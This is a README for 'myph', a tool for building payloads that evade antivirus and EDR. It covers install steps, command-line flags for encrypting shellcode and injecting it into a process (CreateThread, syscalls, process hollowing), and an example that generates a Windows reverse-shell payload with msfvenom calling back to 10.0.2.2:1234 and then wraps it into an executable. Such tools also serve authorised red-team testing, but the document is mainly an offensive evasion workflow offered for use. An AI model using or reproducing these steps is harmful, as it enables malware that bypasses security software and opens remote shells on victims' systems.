# myph

AV/EDR bypass payload creation tool

## Disclaimer

The access to and the use of the information on this repository is free of charge,
but implies the tacit acceptance by the user of the following conditions, without prejudice to the applicable legal provisions.
The user acknowledges that this repository is intended for informational purposes only and therefore serves only
for general information and testing. The tool and this repository are carefully compiled on the basis of good sources and references.

However, the developers cannot be held liable for for any damage, direct or indirect, of whatever nature as a result of
or related to the access to or use of the software.

## How to use the software ?

> Please note this project is under development & subject to changes.
> Breaking changes can be introduced from release to release.

### Compiling or Installing the project

You can easily compile like so:
```bash
# if you have make installed
make  # you can also use `make help` to check recipes

# if you don't
go build -o myph .
```

> You can also grab the latest release from [here](https://github.com/CMEPW/myph/releases/)

Finally, you can install from the [golang package repository](https://pkg.go.dev/github.com/CMEPW/myph) like so:
```bash
# /!\ lowercase is important /!\
go install github.com/cmepw/myph@latest
```

### Usage

```bash
Usage:
  myph [flags]

Flags:
  -e, --encryption encKind   encryption method. (allowed: AES, chacha20, XOR, blowfish) (default AES)
  -h, --help                 help for myph
  -k, --key string           encryption key, auto-generated if empty. (if used by --encryption)
  -f, --out string           output name (default "payload.exe")
  -p, --process string       target process to inject shellcode to (default "cmd.exe")
  -s, --shellcode string     shellcode path (default "msf.raw")
      --sleep-time uint      sleep time in seconds before executing loader (default: 0)
  -t, --technique string     shellcode-loading technique (allowed: CRT, ProcessHollowing, CreateThread, Syscall) (default "CRT")
  -v, --version              version for myph
```

#### Methods

This tool supports few methods for now, but aims to add more as time goes on:
- CreateThread
- CreateRemoteThread
- Syscall
- Process hollowing

If you don't know what that is about, go check out [this repository](https://github.com/CMEPW/BypassAV) :)~


#### Example

Generate a payload like so:

```bash
# generate your payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.2 LPORT=1234 -f raw -o msf.raw

# run myph (--shellcode is not mandatory here because we use the default value)
./myph --shellcode msf.raw --out something.exe

# you should find your payload here
file ./something.exe
```

#### Using docker

```bash
# using makefile
make docker

# going through dockerfile directly
docker build . -t myph:latest
```

### Contributing

Contributions are welcome, but please try to keep PRs short and issues descriptive. :)~

A guide on how to use the tool is in the works, please let us know if you're interested in helping out.
